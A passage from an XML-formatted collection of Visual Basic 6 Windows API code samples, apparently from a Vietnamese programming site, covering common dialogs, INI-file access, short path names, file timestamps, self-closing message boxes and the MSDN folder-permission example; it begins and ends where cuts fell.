    MsgBox "This form's width:" + Str$(rectCopy.Right - rectCopy.Left) + " pixels"
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0605141418070676</MaVD>
    <NoiDung>'Example by Robin (rbnwares@edsamail.com.ph)
'http://members.fortunecity.com/rbnwares1
Private Declare Function WriteProfileString Lib "kernel32" Alias "WriteProfileStringA" (ByVal lpszSection As String, ByVal lpszKeyName As String, ByVal lpszString As String) As Long
Private Declare Function GetProfileInt Lib "kernel32" Alias "GetProfileIntA" (ByVal lpAppName As String, ByVal lpKeyName As String, ByVal nDefault As Long) As Long
Private Sub Form_Load()
    'Write a number 2001 on WIN.INI
    Call WriteProfileString("rBnwares", "Year", "2001")
    'Display the number, no need to convert the value returned
    MsgBox GetProfileInt("rBnwares", "Year", 0)
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0605141526421115</MaVD>
    <NoiDung>'Form code:
Private Sub Form_Load()
Dim CDlg As COMDLG
    'Open file
    If ShowOpen(CDlg) Then MsgBox CDlg.Filename,, "Ban da chon:"
    
    'Save file
    If ShowSave(CDlg) Then MsgBox CDlg.Filename,, "Ban da chon:"
    
    'Chon mau
    If ShowColor(CDlg) Then MsgBox CDlg.Color,, "Ban da chon:"
    
    'Chon Font
    CDlg.flagsFont = CF_BOTH Or CF_LIMITSIZE
    CDlg.hwndOwner = Me.hwnd 'Can be ignored
    CDlg.hInstance = App.hInstance 'Can be ignored
    CDlg.flagsFont = CF_BOTH Or CF_LIMITSIZE
    CDlg.FontName = "Tahoma"
    CDlg.FontBold = True
    CDlg.FontUnderline = True
    CDlg.FontItatic = True
    CDlg.FontSizeMax = 20
    CDlg.FontSizeMin = 8
    If ShowFont(CDlg) Then MsgBox CDlg.FontName,, "Ban da chon:"
End Sub

'Module code:
'Author: PMT
Option Explicit

'############  KHAI BAO CAC API CAN SU DUNG  ############

Private Declare Function GetOpenFileName Lib "comdlg32.dll" Alias "GetOpenFileNameW" (pOpenfilename As OPENFILENAME) As Long
Private Declare Function GetSaveFileName Lib "comdlg32.dll" Alias "GetSaveFileNameW" (pOpenfilename As OPENFILENAME) As Long
Private Declare Function ChooseFont Lib "comdlg32.dll" Alias "ChooseFontA" (pChoosefont As ChooseFont) As Long
Private Declare Function ChooseColor Lib "comdlg32.dll" Alias "ChooseColorA" (pChoosecolor As ChooseColor) As Long
Private Declare Function GlobalLock Lib "kernel32" (ByVal hMem As Long) As Long
Private Declare Function GlobalUnlock Lib "kernel32" (ByVal hMem As Long) As Long
Private Declare Function GlobalAlloc Lib "kernel32" (ByVal wFlags As Long, ByVal dwBytes As Long) As Long
Private Declare Function GlobalFree Lib "kernel32" (ByVal hMem As Long) As Long
Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (hpvDest As Any, hpvSource As Any, ByVal cbCopy As Long)


'############  DINH NGHIA CAC KIEU DU LIEU VA HANG SO CAN SU DUNG  ############

Private Type OPENFILENAME
    lStructSize As Long
    hwndOwner As Long
    hInstance As Long
    lpstrFilter As Long
    lpstrCustomFilter As String
    nMaxCustFilter As Long
    nFilterIndex As Long
    lpstrFile As Long
    nMaxFile As Long
    lpstrFileTitle As String
    nMaxFileTitle As Long
    lpstrInitialDir As Long
    lpstrTitle As Long
    flags As Long
    nFileOffset As Integer
    nFileExtension As Integer
    lpstrDefExt As Long
    lCustData As Long
    lpfnHook As Long
    lpTemplateName As String
End Type

Private Type ChooseColor
    lStructSize As Long
    hwndOwner As Long
    hInstance As Long
    rgbResult As Long
    lpCustColors As Long
    flags As Long
    lCustData As Long
    lpfnHook As Long
    lpTemplateName As String
End Type

Private Type ChooseFont
    lStructSize As Long
    hwndOwner As Long          '  caller's window handle
    hDC As Long                '  printer DC/IC or NULL
    lpLogFont As Long          '  ptr. to a LOGFONT struct
    iPointSize As Long         '  10 * size in points of selected font
    flags As Long              '  enum. type flags
    rgbColors As Long          '  returned text color
    lCustData As Long          '  data passed to hook fn.
    lpfnHook As Long           '  ptr. to hook function
    lpTemplateName As String     '  custom template name
    hInstance As Long          '  instance handle of.EXE that contains cust. dlg. template
    lpszStyle As String          '  return the style field here must be LF_FACESIZE or bigger
    nFontType As Integer          '  same value reported to the EnumFonts call back with the extra FONTTYPE bits added
    MISSING_ALIGNMENT As Integer
    nSizeMin As Long           '  minimum pt size allowed &amp;
    nSizeMax As Long           '  max pt size allowed if CF_LIMITSIZE is used
End Type

Private Type LOGFONT
    lfHeight As Long
    lfWidth As Long
    lfEscapement As Long
    lfOrientation As Long
    lfWeight As Long
    lfItalic As Byte
    lfUnderline As Byte
    lfStrikeOut As Byte
    lfCharSet As Byte
    lfOutPrecision As Byte
    lfClipPrecision As Byte
    lfQuality As Byte
    lfPitchAndFamily As Byte
    lfFaceName As String * 31
End Type
    
Public Type COMDLG
    Color As Long
    DefExt As String
    flagsOpenSave As OpenSaveflags
    flagsColor As Colorflags
    flagsFont As Fontflags
    flagsPrint As Long
    hwndOwner As Long
    hInstance As Long
    Filter As String
    FilterIndex As Long
    Filename As String
    InitDir As String
    Title As String
    FontColor As Long
    FontName As String
    FontSize As Integer
    FontBold As Boolean
    FontItatic As Boolean
    FontUnderline As Boolean
    FontStrikeOut As Boolean
    FontSizeMax As Integer
    FontSizeMin As Integer
    hDC As Long
End Type

Public Enum Colorflags
    CC_ANYCOLOR = &amp;H100
    CC_FULLOPEN = &amp;H2
    CC_PREVENTFULLOPEN = &amp;H4
    CC_RGBINIT = &amp;H1
    CC_SOLIDCOLOR = &amp;H80
End Enum

Public Enum Fontflags
    CF_TTONLY = &amp;H40000
    CF_FIXEDPITCHONLY = &amp;H4000&amp;
    CF_NOFACESEL = &amp;H80000
    CF_NOSCRIPTSEL = &amp;H800000
    CF_NOSTYLESEL = &amp;H100000
    CF_NOSIZESEL = &amp;H200000
    CF_NOVERTFONTS = &amp;H1000000
    CF_PRINTERFONTS = &amp;H2
    CF_SCALABLEONLY = &amp;H20000
    CF_SCREENFONTS = &amp;H1
    CF_ANSIONLY = &amp;H400&amp;
    CF_SCRIPTSONLY = CF_ANSIONLY
    CF_SELECTSCRIPT = &amp;H400000
    CF_SHOWHELP = &amp;H4&amp;
    CF_USESTYLE = &amp;H80&amp;
    CF_WYSIWYG = &amp;H8000
    CF_LIMITSIZE = &amp;H2000&amp;
    CF_BOTH = (CF_SCREENFONTS Or CF_PRINTERFONTS)
End Enum
Private Const CF_INITTOLOGFONTSTRUCT = &amp;H40&amp;
Private Const CF_EFFECTS = &amp;H100&amp;
Private Const CF_FORCEFONTEXIST = &amp;H10000
Private Const BOLD_FONTTYPE = &amp;H100
Private Const ITALIC_FONTTYPE = &amp;H200
Private Const REGULAR_FONTTYPE = &amp;H400
Private Const FW_BOLD = 700
Private Const FW_NORMAL = 400
Private Const DEFAULT_CHARSET = 1
Private Const OUT_DEFAULT_PRECIS = 0
Private Const CLIP_DEFAULT_PRECIS = 0
Private Const DEFAULT_QUALITY = 0
Private Const DEFAULT_PITCH = 0
Private Const FF_ROMAN = 16

Public Enum OpenSaveflags
    OFN_ALLOWMULTISELECT = &amp;H200
    OFN_CREATEPROMPT = &amp;H2000
    OFN_ENABLESIZING = &amp;H800000
    OFN_EXTENSIONDIFFERENT = &amp;H400
    OFN_FILEMUSTEXIST = &amp;H1000
    OFN_HIDEREADONLY = &amp;H4
    OFN_NOCHANGEDIR = &amp;H8
    OFN_NODEREFERENCELINKS = &amp;H100000
    OFN_NONETWORKBUTTON = &amp;H20000
    OFN_NOREADONLYRETURN = &amp;H8000
    OFN_OVERWRITEPROMPT = &amp;H2
    OFN_PATHMUSTEXIST = &amp;H800
    OFN_READONLY = &amp;H1
    OFN_SHOWHELP = &amp;H10
End Enum
Private Const OFN_EXPLORER = &amp;H80000

Private Const WM_INITDIALOG = &amp;H110&amp;
Private Const WM_SETTEXT = &amp;HC
Private Const SWP_NOMOVE = &amp;H2&amp;
Private Const SWP_NOZORDER = &amp;H4&amp;

Const GMEM_MOVEABLE = &amp;H2
Const GMEM_ZEROINIT = &amp;H40

Private pCustomColor(0 To 15) As Long

Private Enum DialogType
    Color
    Font
    OpenSave
    Printing
End Enum
Private Dialog As DialogType

'############################################################################################################

Public Function ShowColor(CDlg As COMDLG) As Boolean
    Dialog = Color
    
    Dim CC As ChooseColor
    CC.lpCustColors = VarPtr(pCustomColor(0))
    CC.rgbResult = CDlg.Color
    CC.hwndOwner = CDlg.hwndOwner
    CC.lStructSize = Len(CC)
    CC.hInstance = CDlg.hInstance
    CC.flags = CDlg.flagsColor
    
    If ChooseColor(CC) Then
        ShowColor = True
        CDlg.Color = CC.rgbResult
    Else
        ShowColor = False
    End If
End Function

Public Function ShowFont(CDlg As COMDLG) As Boolean
    Dialog = Font
    
    Dim CF As ChooseFont, LFONT As LOGFONT, hMem As Long, pMem As Long

    LFONT.lfFaceName = CDlg.FontName &amp; vbNullChar
    LFONT.lfItalic = CDlg.FontItatic
    LFONT.lfUnderline = CDlg.FontUnderline
    LFONT.lfStrikeOut = CDlg.FontStrikeOut
    LFONT.lfCharSet = DEFAULT_CHARSET
    LFONT.lfOutPrecision = OUT_DEFAULT_PRECIS
    LFONT.lfClipPrecision = CLIP_DEFAULT_PRECIS
    LFONT.lfQuality = DEFAULT_QUALITY
    LFONT.lfPitchAndFamily = DEFAULT_PITCH Or FF_ROMAN
    If CDlg.FontBold Then
        LFONT.lfWeight = FW_BOLD
    Else
        LFONT.lfWeight = FW_NORMAL
    End If

    CF.iPointSize = CDlg.FontSize * 10
    CF.nSizeMax = CDlg.FontSizeMax
    CF.nSizeMin = CDlg.FontSizeMin
    CF.lStructSize = Len(CF)
    CF.hInstance = CDlg.hInstance
    CF.hwndOwner = CDlg.hwndOwner
    CF.hDC = CDlg.hDC
    CF.flags = CDlg.flagsFont Or CF_EFFECTS Or CF_FORCEFONTEXIST Or CF_INITTOLOGFONTSTRUCT
    hMem = GlobalAlloc(GMEM_MOVEABLE Or GMEM_ZEROINIT, Len(LFONT))
    pMem = GlobalLock(hMem)
    CopyMemory ByVal pMem, LFONT, Len(LFONT)
    CF.lpLogFont = pMem

    If ChooseFont(CF) Then
        ShowFont = True
        CopyMemory LFONT, ByVal pMem, Len(LFONT)
        CDlg.FontName = left(LFONT.lfFaceName, InStr(LFONT.lfFaceName, vbNullChar) - 1)
        CDlg.FontColor = CF.rgbColors
        CDlg.FontBold = (LFONT.lfWeight = FW_BOLD)
        CDlg.FontItatic = (CF.nFontType And ITALIC_FONTTYPE)
        CDlg.FontStrikeOut = LFONT.lfStrikeOut
        CDlg.FontUnderline = LFONT.lfUnderline
        CDlg.FontSize = CF.iPointSize \ 10
    Else
        ShowFont = False
    End If
    
    Call GlobalUnlock(hMem)
    Call GlobalFree(hMem)
End Function

Public Function ShowOpen(CDlg As COMDLG) As Boolean
    Dialog = OpenSave
    
    Dim File As String, OFName As OPENFILENAME
    OFName.lStructSize = Len(OFName)
    OFName.nMaxFile = 260
    OFName.flags = CDlg.flagsOpenSave Or OFN_EXPLORER
    OFName.hwndOwner = CDlg.hwndOwner
    OFName.hInstance = CDlg.hInstance
    
    CDlg.Filter = Replace(CDlg.Filter, "|", Chr(0))
    OFName.lpstrFilter = StrPtr(CDlg.Filter)
    OFName.lpstrDefExt = StrPtr(CDlg.DefExt)
    OFName.lpstrTitle = StrPtr(CDlg.Title)
    File = CDlg.Filename
    File = File &amp; Space$(261 - Len(File))
    OFName.lpstrFile = StrPtr(File)
    OFName.lpstrInitialDir = StrPtr(CDlg.InitDir)
    
    If GetOpenFileName(OFName) Then
        ShowOpen = True
        CDlg.Filename = left$(File, InStr(1, File, vbNullChar) - 1)
        CDlg.FilterIndex = OFName.nFilterIndex
    Else
        ShowOpen = False
    End If
End Function

Public Function ShowSave(CDlg As COMDLG) As Boolean
    Dialog = OpenSave

    Dim File As String, OFName As OPENFILENAME
    OFName.lStructSize = Len(OFName)
    OFName.nMaxFile = 260
    OFName.flags = CDlg.flagsOpenSave Or OFN_EXPLORER
    OFName.hwndOwner = CDlg.hwndOwner
    OFName.hInstance = CDlg.hInstance
    
    CDlg.Filter = Replace(CDlg.Filter, "|", Chr(0))
    OFName.lpstrFilter = StrPtr(CDlg.Filter)
    OFName.lpstrDefExt = StrPtr(CDlg.DefExt)
    OFName.lpstrTitle = StrPtr(CDlg.Title)
    File = CDlg.Filename
    File = File &amp; Space$(261 - Len(File))
    OFName.lpstrFile = StrPtr(File)
    OFName.lpstrInitialDir = StrPtr(CDlg.InitDir)
    
    If GetSaveFileName(OFName) Then
        ShowSave = True
        CDlg.Filename = left$(File, InStr(1, File, vbNullChar) - 1)
        CDlg.FilterIndex = OFName.nFilterIndex
    Else
        ShowSave = False
    End If
End Function</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0605142318460689</MaVD>
    <NoiDung>Private Declare Function GetShortPathName Lib "kernel32" Alias "GetShortPathNameA" (ByVal lpszLongPath As String, ByVal lpszShortPath As String, ByVal lBuffer As Long) As Long
Public Function GetShortPath(strFileName As String) As String
    'KPD-Team 1999
    'URL: http://www.allapi.net/
    'E-Mail: KPDTeam@Allapi.net
    Dim lngRes As Long, strPath As String
    'Create a buffer
    strPath = String$(165, 0)
    'retrieve the short pathname
    lngRes = GetShortPathName(strFileName, strPath, 164)
    'remove all unnecessary chr$(0)'s
    GetShortPath = Left$(strPath, lngRes)
End Function
Private Sub Form_Load()
    MsgBox GetShortPath("c:\Program Files\")
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0605142353062970</MaVD>
    <NoiDung>
'This project needs a Common Dialog box, named CDBox.
'  (To add the Common Dialog Box to your tools menu, go to Project-&gt;Components (or press CTRL-T)
'   and select Microsoft Common Dialog control)
Private Type FILETIME
    dwLowDateTime As Long
    dwHighDateTime As Long
End Type
    Private Type SYSTEMTIME
    wYear As Integer
    wMonth As Integer
    wDayOfWeek As Integer
    wDay As Integer
    wHour As Integer
    wMinute As Integer
    wSecond As Integer
    wMilliseconds As Integer
End Type
Private Const GENERIC_WRITE = &amp;H40000000
Private Const OPEN_EXISTING = 3
Private Const FILE_SHARE_READ = &amp;H1
Private Const FILE_SHARE_WRITE = &amp;H2
Private Declare Function CreateFile Lib "kernel32" Alias "CreateFileA" (ByVal lpFileName As String, ByVal dwDesiredAccess As Long, ByVal dwShareMode As Long, ByVal lpSecurityAttributes As Long, ByVal dwCreationDisposition As Long, ByVal dwFlagsAndAttributes As Long, ByVal hTemplateFile As Long) As Long
Private Declare Function SetFileTime Lib "kernel32" (ByVal hFile As Long, lpCreationTime As FILETIME, lpLastAccessTime As FILETIME, lpLastWriteTime As FILETIME) As Long
Private Declare Function SystemTimeToFileTime Lib "kernel32" (lpSystemTime As SYSTEMTIME, lpFileTime As FILETIME) As Long
Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Private Declare Function LocalFileTimeToFileTime Lib "kernel32" (lpLocalFileTime As FILETIME, lpFileTime As FILETIME) As Long
Private Sub Form_Load()
    'KPD-Team 1998
    'URL: http://www.allapi.net/
    'KPDTeam@Allapi.net
    Dim m_Date As Date, lngHandle As Long
    Dim udtFileTime As FILETIME
    Dim udtLocalTime As FILETIME
    Dim udtSystemTime As SYSTEMTIME
    m_Date = Format(Now, "DD-MM-YY")

    'Set the dialog's title
    CDBox.DialogTitle = "Choose a file ..."
    'Set the dialog's filter
    CDBox.Filter = "All Files (*.*)|*.*"
    'Show the 'Open File'-dialog
    CDBox.ShowOpen

    udtSystemTime.wYear = Year(m_Date)
    udtSystemTime.wMonth = Month(m_Date)
    udtSystemTime.wDay = Day(m_Date)
    udtSystemTime.wDayOfWeek = WeekDay(m_Date) - 1
    udtSystemTime.wHour = Hour(m_Date)
    udtSystemTime.wMinute = Minute(m_Date)
    udtSystemTime.wSecond = Second(m_Date)
    udtSystemTime.wMilliseconds = 0

    ' convert system time to local time
    SystemTimeToFileTime udtSystemTime, udtLocalTime
    ' convert local time to GMT
    LocalFileTimeToFileTime udtLocalTime, udtFileTime
    ' open the file to get the filehandle
    lngHandle = CreateFile(CDBox.Filename, GENERIC_WRITE, FILE_SHARE_READ Or FILE_SHARE_WRITE, ByVal 0&amp;, OPEN_EXISTING, 0, 0)
    ' change date/time property of the file
    SetFileTime lngHandle, udtFileTime, udtFileTime, udtFileTime
    ' close the handle
    CloseHandle lngHandle
    MsgBox "The date of the file '" + CDBox.Filename + "' has been changed to" + Str$(m_Date), vbInformation + vbOKOnly, App.Title
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0605182312501321</MaVD>
    <NoiDung>'Module code:
Public Const NV_CLOSEMSGBOX As Long = &amp;H5000&amp;
Public Declare Function SetTimer&amp; Lib "user32" (ByVal hWnd&amp;, ByVal nIDEvent&amp;, _
ByVal uElapse&amp;, ByVal lpTimerFunc&amp;)

Public Declare Function FindWindow&amp; Lib "user32" Alias "FindWindowA" _
(ByVal lpClassName$, ByVal lpWindowName$)

Public Declare Function LockWindowUpdate&amp; Lib "user32" (ByVal hwndLock&amp;)

Public Declare Function SetForegroundWindow&amp; Lib "user32" (ByVal hWnd&amp;)

Public Declare Function MessageBox&amp; Lib "user32" Alias "MessageBoxA" _
(ByVal hWnd&amp;, ByVal lpText$, ByVal lpCaption$, ByVal wType&amp;)

Public Declare Function KillTimer&amp; Lib "user32" (ByVal hWnd&amp;, ByVal nIDEvent&amp;)

Public Const API_FALSE As Long = 0&amp;

Public Sub TimerProc(ByVal hWnd&amp;, ByVal uMsg&amp;, ByVal idEvent&amp;, ByVal dwTime&amp;)
    KillTimer hWnd, idEvent
    Dim hMessageBox&amp;
    hMessageBox = FindWindow("#32770", "Self Closing MessageBox")
    If hMessageBox Then
        Call SetForegroundWindow(hMessageBox)
        SendKeys "{enter}"
    End If
    Call LockWindowUpdate(API_FALSE)
End Sub

'Form code:
Private Sub Form_Load()
    SetTimer hWnd, NV_CLOSEMSGBOX, 3000&amp;, AddressOf TimerProc
    Call MessageBox(hWnd, "Watch this MessageBox close itself after 3 seconds", _
    "Self Closing MessageBox", MB_ICONQUESTION Or MB_TASKMODAL)
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0606031315550037</MaVD>
    <NoiDung>Được sử dụng bởi SystemParametersInfo</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0606031327331903</MaVD>
    <NoiDung>'Example from MSDN (Q240176)
'The following code changes permissions on a folder to Add &amp; Read or Change.
'The folder needs to be created on an NTFS partition.
'You need to be an Administrator on the machine in question and have read/write
'(READ_CONTROL and WRITE_DAC) access to the file or directory.

'1. Create a Standard EXE project in Visual Basic. Form1 is created by default.
'2. Add two Textboxes (Text1 and Text2) and two CommandButtons (Command1 and Command2) to Form1.
'3. Add the following code to the form and the module
'4. Run the application.
'5. In the Test1 TextBox, enter the name of the folder you want to change permissions on. (D:\test is entered by default.)
'    In the Test2 Textbox, enter the name of the user you want to give these permissions to.
'6. Click the Add &amp; Read permissions button to give Add &amp; Read permissions to the folder, or click the Change Permissions
'    button to give Change permissions to the folder.
'7. To check the permissions on the folder, right-click Explorer. Select the Properties menu item, and click the Security
'    Tab of the Properties dialog box. On the Security tab, click the Permissions button. The specific account should say
'    Add &amp; Read or Change depending on which button you clicked in the preceding sample.

'Add this code to the form
Private Sub Command1_Click()
    Dim sUserName As String
    Dim sFolderName As String
    sUserName = Trim$(CStr(Text2.Text))
    sFolderName = Trim$(CStr(Text1.Text))
    SetAccess sUserName, sFolderName, GENERIC_READ Or GENERIC_EXECUTE Or DELETE Or GENERIC_WRITE
End Sub
Private Sub Command2_Click()
    Dim sUserName As String
    Dim sFolderName As String
    sUserName = Trim$(Text2.Text)
    sFolderName = Trim$(Text1.Text)
    SetAccess sUserName, sFolderName, GENERIC_EXECUTE Or GENERIC_READ
End Sub
Private Sub Form_Load()
    Text1.Text = "enter folder name"
    Text2.Text = "enter username"
    Command1.Caption = "Change"
    Command2.Caption = "Read &amp; Add"
End Sub

'Add this code to a module

' Constants used within our API calls. Refer to the MSDN for more
' information on how/what these constants are used for.

' Memory constants used through various memory API calls.
Public Const GMEM_MOVEABLE = &amp;H2
Public Const LMEM_FIXED = &amp;H0
Public Const LMEM_ZEROINIT = &amp;H40
Public Const LPTR = (LMEM_FIXED + LMEM_ZEROINIT)
Public Const GENERIC_READ = &amp;H80000000
Public Const GENERIC_ALL = &amp;H10000000
Public Const GENERIC_EXECUTE = &amp;H20000000
Public Const GENERIC_WRITE = &amp;H40000000

' The file/security API call constants.
' Refer to the MSDN for more information on how/what these constants
' are used for.
Public Const DACL_SECURITY_INFORMATION = &amp;H4
Public Const SECURITY_DESCRIPTOR_REVISION = 1
Public Const SECURITY_DESCRIPTOR_MIN_LENGTH = 20
Public Const SD_SIZE = (65536 + SECURITY_DESCRIPTOR_MIN_LENGTH)
Public Const ACL_REVISION2 = 2
Public Const ACL_REVISION = 2
Public Const MAXDWORD = &amp;HFFFFFFFF
Public Const SidTypeUser = 1
Public Const AclSizeInformation = 2

'  The following are the inherit flags that go into the AceFlags field
'  of an Ace header.

Public Const OBJECT_INHERIT_ACE = &amp;H1
Public Const CONTAINER_INHERIT_ACE = &amp;H2
Public Const NO_PROPAGATE_INHERIT_ACE = &amp;H4
Public Const INHERIT_ONLY_ACE = &amp;H8
Public Const INHERITED_ACE = &amp;H10
Public Const VALID_INHERIT_FLAGS = &amp;H1F
Public Const DELETE = &amp;H10000

' Structures used by our API calls.
' Refer to the MSDN for more information on how/what these
' structures are used for.
Type ACE_HEADER
   AceType As Byte
   AceFlags As Byte
   AceSize As Integer
End Type


Public Type ACCESS_DENIED_ACE
  Header As ACE_HEADER
  Mask As Long
  SidStart As Long
End Type

Type ACCESS_ALLOWED_ACE
   Header As ACE_HEADER
   Mask As Long
   SidStart As Long
End Type

Type ACL
   AclRevision As Byte
   Sbz1 As Byte
   AclSize As Integer
   AceCount As Integer
   Sbz2 As Integer
End Type

Type ACL_SIZE_INFORMATION
   AceCount As Long
   AclBytesInUse As Long
   AclBytesFree As Long
End Type

Type SECURITY_DESCRIPTOR
   Revision As Byte
   Sbz1 As Byte
   Control As Long
   Owner As Long
   Group As Long
   sACL As ACL
   Dacl As ACL
End Type

' API calls used within this sample. Refer to the MSDN for more
' information on how/what these APIs do.

Declare Function GetComputerName Lib "kernel32" Alias "GetComputerNameA" (ByVal lpBuffer As String, nSize As Long) As Long
Declare Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, nSize As Long) As Long
Declare Function LookupAccountName Lib "advapi32.dll" Alias "LookupAccountNameA" (lpSystemName As String, ByVal lpAccountName As String, sid As Any, cbSid As Long, ByVal ReferencedDomainName As String, cbReferencedDomainName As Long, peUse As Long) As Long
Declare Function InitializeSecurityDescriptor Lib "advapi32.dll" (pSecurityDescriptor As SECURITY_DESCRIPTOR, ByVal dwRevision As Long) As Long
Declare Function GetSecurityDescriptorDacl Lib "advapi32.dll" (pSecurityDescriptor As Byte, lpbDaclPresent As Long, pDacl As Long, lpbDaclDefaulted As Long) As Long
Declare Function GetFileSecurityN Lib "advapi32.dll" Alias "GetFileSecurityA" (ByVal lpFileName As String, ByVal RequestedInformation As Long, ByVal pSecurityDescriptor As Long, ByVal nLength As Long, lpnLengthNeeded As Long) As Long
Declare Function GetFileSecurity Lib "advapi32.dll" Alias "GetFileSecurityA" (ByVal lpFileName As String, ByVal RequestedInformation As Long, pSecurityDescriptor As Byte, ByVal nLength As Long, lpnLengthNeeded As Long) As Long
Declare Function GetAclInformation Lib "advapi32.dll" (ByVal pAcl As Long, pAclInformation As Any, ByVal nAclInformationLength As Long, ByVal dwAclInformationClass As Long) As Long
Public Declare Function EqualSid Lib "advapi32.dll" (pSid1 As Byte, ByVal pSid2 As Long) As Long
Declare Function GetLengthSid Lib "advapi32.dll" (pSid As Any) As Long
Declare Function InitializeAcl Lib "advapi32.dll" (pAcl As Byte, ByVal nAclLength As Long, ByVal dwAclRevision As Long) As Long
Declare Function GetAce Lib "advapi32.dll" (ByVal pAcl As Long, ByVal dwAceIndex As Long, pace As Any) As Long
Declare Function AddAce Lib "advapi32.dll" (ByVal pAcl As Long, ByVal dwAceRevision As Long, ByVal dwStartingAceIndex As Long, ByVal pAceList As Long, ByVal nAceListLength As Long) As Long
Declare Function AddAccessAllowedAce Lib "advapi32.dll" (pAcl As Byte, ByVal dwAceRevision As Long, ByVal AccessMask As Long, pSid As Byte) As Long
Public Declare Function AddAccessDeniedAce Lib "advapi32.dll" (pAcl As Byte, ByVal dwAceRevision As Long, ByVal AccessMask As Long, pSid As Byte) As Long
Declare Function SetSecurityDescriptorDacl Lib "advapi32.dll" (pSecurityDescriptor As SECURITY_DESCRIPTOR, ByVal bDaclPresent As Long, pDacl As Byte, ByVal bDaclDefaulted As Long) As Long
Declare Function SetFileSecurity Lib "advapi32.dll" Alias "SetFileSecurityA" (ByVal lpFileName As String, ByVal SecurityInformation As Long, pSecurityDescriptor As SECURITY_DESCRIPTOR) As Long
Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (hpvDest As Any, ByVal hpvSource As Long, ByVal cbCopy As Long)
Public Sub SetAccess(sUserName As String, sFileName As String, lMask As Long)
   Dim lResult As Long            ' Result of various API calls.
   Dim I As Integer               ' Used in looping.
   Dim bUserSid(255) As Byte      ' This will contain your SID.
   Dim bTempSid(255) As Byte      ' This will contain the Sid of each ACE in the ACL .
   Dim sSystemName As String      ' Name of this computer system.

   Dim lSystemNameLength As Long  ' Length of string that contains
                                  ' the name of this system.

   Dim lLengthUserName As Long    ' Max length of user name.

   'Dim sUserName As String * 255  ' String to hold the current user
                                  ' name.


   Dim lUserSID As Long           ' Used to hold the SID of the
                                  ' current user.

   Dim lTempSid As Long            ' Used to hold the SID of each ACE in the ACL
   Dim lUserSIDSize As Long          ' Size of the SID.
   Dim sDomainName As String * 255   ' Domain the user belongs to.
   Dim lDomainNameLength As Long     ' Length of domain name needed.

   Dim lSIDType As Long              ' The type of SID info we are
                                     ' getting back.

   Dim sFileSD As SECURITY_DESCRIPTOR   ' SD of the file we want.

   Dim bSDBuf() As Byte           ' Buffer that holds the security
                                  ' descriptor for this file.

   Dim lFileSDSize As Long           ' Size of the File SD.
   Dim lSizeNeeded As Long           ' Size needed for SD for file.


   Dim sNewSD As SECURITY_DESCRIPTOR ' New security descriptor.

   Dim sACL As ACL                   ' Used in grabbing the DACL from
                                     ' the File SD.

   Dim lDaclPresent As Long          ' Used in grabbing the DACL from
                                     ' the File SD.

   Dim lDaclDefaulted As Long        ' Used in grabbing the DACL from
                                     ' the File SD.

   Dim sACLInfo As ACL_SIZE_INFORMATION  ' Used in grabbing the ACL
                                         ' from the File SD.

   Dim lACLSize As Long           ' Size of the ACL structure used
                                  ' to get the ACL from the File SD.

   Dim pAcl As Long               ' Current ACL for this file.
   Dim lNewACLSize As Long        ' Size of new ACL to create.
   Dim bNewACL() As Byte          ' Buffer to hold new ACL.

   Dim sCurrentACE As ACCESS_ALLOWED_ACE    ' Current ACE.
   Dim pCurrentAce As Long                  ' Our current ACE.

   Dim nRecordNumber As Long

   ' Get the SID of the user. (Refer to the MSDN for more information on SIDs
   ' and their function/purpose in the operating system.) Get the SID of this
   ' user by using the LookupAccountName API. In order to use the SID
   ' of the current user account, call the LookupAccountName API
   ' twice. The first time is to get the required sizes of the SID
   ' and the DomainName string. The second call is to actually get
   ' the desired information.

   lResult = LookupAccountName(vbNullString, sUserName, _
      bUserSid(0), 255, sDomainName, lDomainNameLength, _
      lSIDType)

   ' Now set the sDomainName string buffer to its proper size before
   ' calling the API again.
   sDomainName = Space(lDomainNameLength)

   ' Call the LookupAccountName again to get the actual SID for user.
   lResult = LookupAccountName(vbNullString, sUserName, _
      bUserSid(0), 255, sDomainName, lDomainNameLength, _
      lSIDType)

   ' Return value of zero means the call to LookupAccountName failed;
   ' test for this before you continue.
     If (lResult = 0) Then
        MsgBox "Error: Unable to Lookup the Current User Account: " _
           &amp; sUserName
        Exit Sub
     End If

   ' You now have the SID for the user who is logged on.
   ' The SID is of interest since it will get the security descriptor
   ' for the file that the user is interested in.
   ' The GetFileSecurity API will retrieve the Security Descriptor
   ' for the file. However, you must call this API twice: once to get
   ' the proper size for the Security Descriptor and once to get the
   ' actual Security Descriptor information.

   lResult = GetFileSecurityN(sFileName, DACL_SECURITY_INFORMATION, _
      0, 0, lSizeNeeded)

   ' Redimension the Security Descriptor buffer to the proper size.
   ReDim bSDBuf(lSizeNeeded)

   ' Now get the actual Security Descriptor for the file.
   lResult = GetFileSecurity(sFileName, DACL_SECURITY_INFORMATION, _
      bSDBuf(0), lSizeNeeded, lSizeNeeded)

   ' A return code of zero means the call failed; test for this
   ' before continuing.
   If (lResult = 0) Then
      MsgBox "Error: Unable to Get the File Security Descriptor"
      Exit Sub
   End If

   ' Call InitializeSecurityDescriptor to build a new SD for the
   ' file.
   lResult = InitializeSecurityDescriptor(sNewSD, _
      SECURITY_DESCRIPTOR_REVISION)

   ' A return code of zero means the call failed; test for this
   ' before continuing.
   If (lResult = 0) Then
      MsgBox "Error: Unable to Initialize New Security Descriptor"
      Exit Sub
   End If

   ' You now have the file's SD and a new Security Descriptor
   ' that will replace the current one. Next, pull the DACL from
   ' the SD. To do so, call the GetSecurityDescriptorDacl API
   ' function.

   lResult = GetSecurityDescriptorDacl(bSDBuf(0), lDaclPresent, _
      pAcl, lDaclDefaulted)

   ' A return code of zero means the call failed; test for this
   ' before continuing.
   If (lResult = 0) Then
      MsgBox "Error: Unable to Get DACL from File Security " _
         &amp; "Descriptor"
      Exit Sub
   End If

   ' You have the file's SD, and want to now pull the ACL from the
   ' SD. To do so, call the GetACLInformation API function.
   ' See if ACL exists for this file before getting the ACL
